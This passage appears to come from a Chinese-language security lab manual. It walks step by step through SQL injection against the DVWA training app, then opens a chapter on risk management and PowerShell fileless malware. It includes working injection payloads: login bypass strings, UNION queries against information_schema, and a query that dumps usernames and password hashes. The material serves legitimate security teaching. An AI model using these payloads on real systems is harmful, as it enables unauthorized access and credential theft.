  \ FROM\nusers WHERE user_id = '3';\n```\n\n现在，在一对单引号之间插入的是 3 而不是 1，这就是我们看到这条特定记录的原因。\n\
  \n![](img/6e921d997751f0a0f87e5170ac9657a1_693_1.png)\n\n### 第 6 步\n\n现在大胆一点，在 User\
  \ ID 文本框中输入以下内容（注意，w 可以是任意字符）：\n\n```sql\nw' OR '1' = '1\n```\n\n实际执行的查询似乎是：\n\n\
  ```sql\nSELECT first_name 'First name', last_name Surname FROM\nusers WHERE user_id\
  \ = 'w' OR '1' = '1';\n```\n\n这里的 w 是一个虚拟占位值，可以是任意字符，甚至可以不写。两个 1 也可以换成任意内容，同样也可以不写。因此输入甚至可以简单成这样：\n\
  \n```sql\n' OR ' ' = '\n```\n\n再来看一下这个查询，我们对关键部分加粗，并对输入加下划线：\n\n```sql\nSELECT first_name\
  \ 'First name', last_name Surname FROM\nusers WHERE user_id = 'w' OR '1' = '1';\n\
  ```\n\n输入在分号之前结束。这是因为 SQL 语句总是会把引号放在这些位置。w 后面的单引号终止了 user_id 字符串，而 SQL 放在分号前的单引号则终止了等值比较右侧的内容。\n\
  \n![](img/6e921d997751f0a0f87e5170ac9657a1_695_0.png)\n\n### 第 7 步\n\n如果存在密码字段，并且用户名字段中填入了任意内容，那么输入可能是这样的：\n\
  \n```sql\npassword' OR '1' = '1'\n```\n\n简化后的查询可能是这样的：\n\n```sql\nSELECT id FROM\
  \ users WHERE username = 'username' AND password = 'password' OR '1' = '1'\n```\n\
  \nAND 会先被处理，因为输入的用户名和密码不正确，所以会产生一个 false。\n\n现在查询被化简为：\n\n```sql\nSELECT id FROM\
  \ users WHERE false OR '1' = '1'\n```\n\n之前的表达式已被化简为 false 值。\n\n接下来计算 OR。OR 左边是\
  \ false，右边是 true 条件，因此查询现在变成了：\n\n```sql\nSELECT id FROM users WHERE true\n```\n\
  \n如果你确实是在向服务器提交这些值以登录，而不是使用这个 DVWA 程序，那么返回的将是表中创建的第一个用户 ID（而不是所有用户 ID），你将以此用户身份登录。通常第一个创建的用户是管理员，因此在\
  \ SQL 注入攻击中，你会以管理员权限登录。\n\n如有必要，攻击者甚至可以注释掉查询的末尾部分，使其被忽略且仍保持语法正确；不同 RDBMS 使用的注释符号也各有不同，包括：--、/*、#。\n\
  \n![](img/6e921d997751f0a0f87e5170ac9657a1_695_1.png)\n\n尝试输入以下内容。试试下面这些例子。\n\n\
  - b. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon`\n- c.\
  \ `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon' and first_name\
  \ <> 'Hack`\n- d. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon'\
  \ and first_name <> 'Hack' AND first_name <> 'Pablo`\n- e. `w' OR '1' = '1' AND\
  \ first_name <> 'admin' AND first_name <> 'Gordon' and first_name <> 'Hack' AND\
  \ first_name <> 'Pablo' AND first_name <> 'Bob`\n\n在最后一个用户 Bob 之后，将不会返回任何内容。\n\n\
  ### 交叉引用\n\n这一过程与我们在第 7 章中逐步了解 DNS 区域的过程类似。\n\nRDBMS 数据库的表（也称为关系）由行（也称为记录或元组）和列（也称为字段或属性）组成。行和列都不要求按特定顺序排列，但两者都可以进行排序和筛选。\n\
  \n![](img/6e921d997751f0a0f87e5170ac9657a1_697_0.png)\n\n### 第 9 步\n\n你还能用 SQL 注入做些什么？\n\
  \nUNION 运算符将伪造查询与原始查询连接起来。这使攻击者能够访问一些“幕后”元数据，并利用这些元数据发动更强大的攻击。如前所述，# 符号会注释掉查询的末尾部分。现在来看看如何将\
  \ UNION 语句与 # 符号结合使用。\n\nUNION 通过组合两个或多个查询并去除重复行，返回一个结果集，其中包含属于多个查询的所有行。两个 SELECT\
  \ 语句中的表达式数量必须相同，并且伪造查询必须放在特定位置。\n\n```sql\n' UNION SELECT VERSION(), NULL#\n```\n\
  \n- https://mariadb.com/kb/en/union/\n- https://mariadb.com/kb/en/version/\n- https://mariadb.com/kb/en/null-values/\n\
  \n开始吧！看看输出：\n\n```\nID: ' UNION SELECT VERSION(), NULL#\nFirst name: 10.4.10-MariaDB\n\
  Surname:\n```\n\n完整查询是：\n\n```sql\nSELECT first_name 'First name', last_name Surname\
  \ FROM users WHERE user_id = '' UNION SELECT VERSION(), NULL#' ;\n```\n\n由于 `user_id\
  \ = ''` 这部分没有匹配数据库中的任何现有条目，原始查询没有为 first_name 或 last_name 产生任何结果。这些空白结果现在与我们放在表单字段中的查询结果合并在一起。SELECT\
  \ VERSION() 函数调用会返回 RDBMS 的名称和版本，这些信息可用作侦察，以寻找针对该 RDBMS 的漏洞并加以利用。\n\nd. 列的顺序并不重要，如下所示：\n\
  \n```sql\n' UNION SELECT NULL, VERSION()#\n```\n\n完整查询是：\n\n```sql\nSELECT first_name\
  \ 'First name', last_name Surname FROM users WHERE user_id = '' UNION SELECT NULL,\
  \ VERSION()#' ;\n```\n\ne. 将这两个完整语句（来自第 9c 步和第 9d 步）输入 MariaDB 控制台，如图 19-14 所示。\n\
  \n\n\n\n\nMariaDB [dvwa]>\nMariaDB [dvwa]>\nMariaDB [dvwa]>\nMariaDB [dvwa]>\nMariaDB\
  \ [dvwa]> SELECT first_name 'First name', last_name Surname FROM users WHERE user_id\
  \ = '' UNION SELECT VERSION(), NULL#';\n    -> ;\n+----------------+----------+\n\
  | First name     | Surname  |\n+----------------+----------+\n| 10.4.10-MariaDB\
  \ | NULL     |\n+----------------+----------+\n1 row in set (0.001 sec)\n\nMariaDB\
  \ [dvwa]> SELECT first_name 'First name', last_name Surname FROM users WHERE user_id\
  \ = '' UNION SELECT NULL, VERSION()#';\n    -> ;\n+------------+---------------+\n\
  | First name | Surname       |\n+------------+---------------+\n| NULL       | 10.4.10-MariaDB\
  \ |\n+------------+---------------+\n1 row in set (0.001 sec)\n\nMariaDB [dvwa]>\n\
  \n## 图 19-14 在 MariaDB 控制台中的 SQL 注入\n\n由于完整的语句包含了#注释符号，末尾的单引号会被忽略，如前所述。然而，当完整语句直接输入到关系数据库管理系统（RDBMS）中时，分号也会被忽略，这使得MariaDB认为你正在下一行继续输入命令。在箭头提示符（表示上一行在此继续）处，输入一个分号（;）并按回车键来结束完整语句。当SQL注入像通常那样通过Web浏览器执行时，原始语句中的分号不会被#符号注释掉。\n\
  \nUNION输出在MariaDB控制台中可能更容易可视化，因为列是垂直排列的，而DVWA页面上则是水平格式。正如你所看到的，我们伪造查询的输出被添加到了原始查询的结果中。伪造查询输出的第一列将被视为first_name（First\
  \ name），而伪造查询输出的第二列将\n\nk. 查看所有数据库：\n\n```\n' UNION SELECT SCHEMA_NAME, NULL FROM\
  \ information_schema.schemata#\n```\n\ninformation_schema是一个视图数据库（这些虚拟表的内容通过查询动态定义），提供RDBMS中所有表、视图、列和过程的元数据信息。被查询的表名为schemata。\n\
  \nl. 查看所有表：\n\n```\n' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables#\n\
  ```\n\nDVWA页面上的输出会在某处截断，但如果你在MariaDB控制台中输入完整语句，会显示更多输出行。\n\nm. 查看dvwa数据库中的所有表：\n\
  \n```\n' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables where TABLE_SCHEMA='dvwa'#\n\
  ```\n\nn. 显示users表中所有列的名称、所有列的数据类型以及每列的最大字符长度：\n\n```\n' UNION SELECT CONCAT(COLUMN_NAME,\
  \ 0x0A, DATA_TYPE), CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE\
  \ table_name='users'#\n```\n\nhttps://mariadb.com/kb/en/concat/\n\nCONCAT()函数用于组合两个或多个字符串。\n\
  \n0x表示后面跟的是十六进制（基数为16）数。0A是ASCII/Unicode换行符转义序列\\n的十六进制表示，如https://www.asciitable.com所示。\n\
  \n请记住，在此处使用UNION时，每个查询必须恰好返回两列。如果你想要返回多于两列，此时就要用到CONCAT()函数。注意在输出中，列名被放在“First name:”输出中；然后，由于0x0A，输出转到下一行，输出该列的数据类型。最后，“Surname:”输出显示每个字段的最大字符长度。\n\
  \n如果没有0x0A，数据类型**int**会紧跟在列名user_id后面，输出会显得混乱：\n\n```\nFirst name: user_idint\n\
  Surname:\n```\n\n有了0x0A，输出就清晰多了：\n\n```\nFirst name: user_id\nint\nSurname:\n```\n\
  \n事实证明，没有为user_id列定义最大字符长度，这就是为什么“Surname:”输出为空。\n然而，从以下输出可以看出，first_name列的最大字符长度为15，显示在“Surname:”输出中。\n\
  \n```\nFirst name: first_name\nvarchar\nSurname: 15\n```\n\n还要注意，last_name和user的最大字符长度均为15，password的最大字符长度为32，avatar的最大字符长度为70，而最后两个字段last_login和failed_login没有最大字符长度。\n\
  \n如果你想要输出超过三个值，请向**CONCAT()**添加额外的0x0A实例和参数。\n\n- o. 导出所有用户的用户名字、用户名和密码哈希：\n\n```\n\
  ' UNION SELECT first_name, CONCAT(user, 0x0A, password) FROM users#\n```\n\n10\n\
  \n## 步骤10 现在让我们为MariaDB root账户设置密码。在MariaDB控制台中输入以下内容：\n\n```\nSET PASSWORD FOR\
  \ 'root'@'localhost' =\nPASSWORD('CompTIA_Security+');\n```\n"
- "## 第20章 风险管理\n\n## 实验练习\n\n- 20.01 PowerShell 脚本设置\n- 20.02 PowerShell 漏洞利用\n\n\
  实验分析\n\n关键术语测验\n\n以下是美国国家标准与技术研究院（NIST）计算机安全资源中心（CSRC）术语表中关于风险的众多定义之一，见https://csrc.nist.gov/glossary/term/risk：\n\
  \n> 衡量一个实体受到潜在情况或事件威胁的程度，通常是以下两者的函数：（i）如果该情况或事件发生将产生的不利影响；以及\n> （ii）发生的可能性。[注：与信息系统相关的安全风险是指因信息或信息系统的机密性、完整性或可用性丧失而产生的风险，并反映对组织运营（包括使命、职能、形象或声誉）、组织资产、个人、其他组织以及国家可能产生的不利影响。]\n\
  \n风险可以通过策略、流程以及软件/硬件控制来缓解。风险可以通过网络安全保险来转移。风险可以被接受，例如当保护的成本超过资产价值时，你就只能让该资产遭受破坏。风险可以通过移除资产来避免，但在大多数情况下，移除资产也会移除该资产可能带来的任何收益。然而，我们不能说风险可以被消除。\n\
  \nISO 31000是一套被许多国家和大型组织采用的风险管理标准，其在第2.2节中将*风险管理*定义为“指导和控制组织与风险相关的协调活动”，见www.iso.org/obp/ui/#iso:std:iso:31000:ed-1:v1:en。\n\
  \nPowerShell可在多种平台（Windows、Linux和macOS）上运行，是一个用于任务自动化和配置管理的框架。它由命令行外壳及其自己的原生脚本语言组成。\n\
  \nPowerShell绝对在“既可做好事也可做坏事”的清单上。*无文件恶意软件*这个词每天都在被越来越多地使用，听到这个词时你脑海中首先浮现的……就是PowerShell。\n\
  \nPowerShell可以被告知下载恶意脚本或恶意软件。这些文件可以存储在硬盘上，然后由PowerShell启动。然而，情况甚至更糟。恶意脚本和恶意软件可以被PowerShell直接下载到内存（RAM）中，然后由PowerShell直接从内存运行。这意味着对于反恶意软件程序、取证调查员和恶意软件分析人员来说，硬盘上不会留下任何痕迹。这正是*无文件恶意软件*一词的确切含义。\n\
  \n这些攻击通常源于常见的攻击途径：钓鱼邮件、用户下载的恶意软件，或用户点击的恶意链接。PowerShell确实有执行策略，表面上似乎可以防止涉及脚本的攻击发生。然而，正如你将在本章看到的，不幸的是情况根本不是这样。因此，PowerShell对系统和网络构成了巨大的风险。\n\
